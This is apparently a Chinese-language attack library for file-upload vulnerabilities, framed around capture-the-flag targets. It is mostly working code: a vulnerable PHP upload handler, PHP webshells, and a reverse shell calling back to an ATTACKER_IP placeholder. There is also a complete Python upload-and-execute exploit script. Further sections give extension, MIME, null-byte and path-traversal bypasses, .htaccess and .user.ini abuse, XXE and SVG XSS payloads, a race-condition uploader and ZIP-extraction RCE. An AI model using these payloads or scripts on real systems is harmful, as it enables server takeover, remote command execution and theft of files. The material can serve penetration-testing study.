# 文件上传 - 攻击库
**Keywords**: File Upload, Upload Bypass, Unrestricted File Upload, Webshell, PHP Upload, Extension Bypass, MIME Bypass

## 1. 基础文件上传漏洞

### 漏洞类型

```
1. 任意文件上传 - 无验证
2. 扩展名白名单绕过
3. MIME类型检查绕过
4. 文件内容验证绕过
5. 路径遍历结合文件上传
```

### 案例041 - PHP任意文件上传

#### 漏洞代码
```php
<?php
if ($_FILES) {
    $full_path = $path . basename($_FILES["userfile"]["name"]);
    if (move_uploaded_file($_FILES['userfile']['tmp_name'], $full_path)) {
        // 直接保存，无任何验证
        echo "File uploaded successfully";
    }
}
?>
```

#### 攻击方法1: 上传PHP WebShell

```bash
# 创建PHP shell
cat > shell.php << 'EOF'
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "Web Shell - Usage: ?cmd=command";
    system('env');
}
?>
EOF

# 上传shell
curl -X POST "http://target/index.php" \
  -F "userfile=@shell.php" \
  -F "submit=Upload Image"

# 执行命令
curl "http://target/upload/shell.php?cmd=cat%20/flag.txt"
curl "http://target/upload/shell.php?cmd=env"
```

#### 攻击方法2: 上传PHP反向Shell

```bash
# 创建反向shell
cat > reverse.php << 'EOF'
<?php
$sock=fsockopen("ATTACKER_IP",ATTACKER_PORT);
exec("/bin/bash -i <&3 >&3 2>&3");
?>
EOF

# 上传并执行
curl -X POST "http://target/index.php" \
  -F "userfile=@reverse.php"
```

#### Python完整利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
import re

def create_php_shell(filename="shell.php"):
    """创建PHP shell"""
    shell_content = """<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    system('cat /flag.txt');
}
?>"""
    
    with open(filename, 'w') as f:
        f.write(shell_content)
    
    return filename

def upload_and_execute(target_url, shell_file):
    """上传shell并执行命令"""
    upload_url = target_url.rstrip('/') + "/index.php"
    
    print(f"[*] 目标: {target_url}")
    print(f"[*] 上传文件: {shell_file}\n")
    
    # 上传
    with open(shell_file, 'rb') as f:
        files = {'userfile': f}
        data = {'submit': 'Upload Image'}
        r = requests.post(upload_url, files=files, data=data)
    
    print(f"[+] 文件已上传\n")
    
    # 执行
    shell_url = target_url.rstrip('/') + f"/upload/{shell_file}"
    print(f"[*] 执行命令...")
    
    r = requests.get(shell_url)
    
    if 'flag' in r.text.lower():
        print(f"[+] 成功!")
        print(f"\n{'='*60}")
        print(f"[+] 响应:\n{r.text}")
        print(f"{'='*60}\n")
        return r.text
    else:
        print(f"[-] 未找到flag")
        return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <目标URL>")
        sys.exit(1)
    
    target = sys.argv[1]
    shell = create_php_shell()
    upload_and_execute(target, shell)
```

## 2. 文件上传绕过技巧

### 绕过1: 扩展名双写

```bash
# 如果过滤.php，上传.php.jpg
curl -X POST "http://target/upload.php" \
  -F "file=@shell.php.jpg"
```

### 绕过2: 混合大小写

```bash
# 上传.PHP或.pHp
curl -X POST "http://target/upload.php" \
  -F "file=@shell.PHP"
```

### 绕过3: 特殊字符绕过

```bash
# 上传shell.php%00.jpg (空字节截断)
# 或 shell.php::$DATA (Windows ADS)
# 或 shell.php....jpg (多个点)
```

### 绕过4: 修改Content-Type

```bash
# 上传PHP文件但声称是图片
curl -X POST "http://target/upload.php" \
  -F "file=@shell.php;type=image/jpeg"
```

### 绕过5: 图片文件包含PHP

```bash
# 在PNG/JPG文件中嵌入PHP代码
echo "<?php system(\$_GET['cmd']); ?>" >> image.jpg

# 上传
curl -X POST "http://target/upload.php" \
  -F "file=@image.jpg"

# 通过.htaccess执行
cat > .htaccess << 'EOF'
AddType application/x-httpd-php .jpg
EOF

curl -X POST "http://target/upload.php" \
  -F "file=@.htaccess"
```

### 绕过6: 路径遍历

```bash
# 上传到其他目录
curl -X POST "http://target/upload.php" \
  -F "file=@../shell.php"

# 或使用编码
curl -X POST "http://target/upload.php" \
  -F "file=@..%2fshell.php"
```

## 3. 其他文件上传攻击

### 上传.htaccess修改服务器行为

```apache
# 将jpg文件作为PHP执行
AddType application/x-httpd-php .jpg

# 或执行特定文件
<Files "image.jpg">
    SetHandler application/x-httpd-php
</Files>
```

### 上传.user.ini覆盖PHP配置

```ini
# 自动加载恶意脚本
auto_prepend_file=/tmp/shell.php
```

### 上传XML/DTD导致XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>
```

### 上传SVG导致XSS/XXE

```svg
<svg onload="alert('XSS')">
</svg>

<!-- XXE -->
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>
```

## 4. 文件上传后RCE的利用

### 如果上传到可执行目录

```bash
# 上传shell.php -> http://target/upload/shell.php
curl "http://target/upload/shell.php?cmd=id"
```

### 如果上传到不可执行目录

```bash
# 尝试访问其他可执行文件
# 或利用文件包含漏洞
curl "http://target/index.php?file=upload/shell.php"
```

### 利用应用的file包含

```bash
# 如果应用有file参数
curl "http://target/view.php?file=../upload/shell.php"
```

## 5. 高级文件上传技巧

### 竞态条件

```python
import requests
import threading
import time

target = "http://target"
upload_url = f"{target}/upload.php"
execute_url = f"{target}/upload/shell.php"

def upload():
    """持续上传shell"""
    with open('shell.php', 'rb') as f:
        while True:
            files = {'file': f}
            requests.post(upload_url, files=files)

def execute():
    """持续尝试执行"""
    time.sleep(0.5)
    while True:
        r = requests.get(execute_url)
        if r.status_code == 200:
            print(r.text)
            break

# 并发执行
t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=execute)
t1.start()
t2.start()
```

### ZIP上传解压RCE

```bash
# 创建恶意PHP文件
echo "<?php system('cat /flag.txt'); ?>" > shell.php

# 打包为ZIP
zip shell.zip shell.php

# 上传ZIP（如果应用自动解压）
curl -X POST "http://target/upload.php" \
  -F "file=@shell.zip"

# 访问解压后的文件
curl "http://target/upload/shell.php"
```

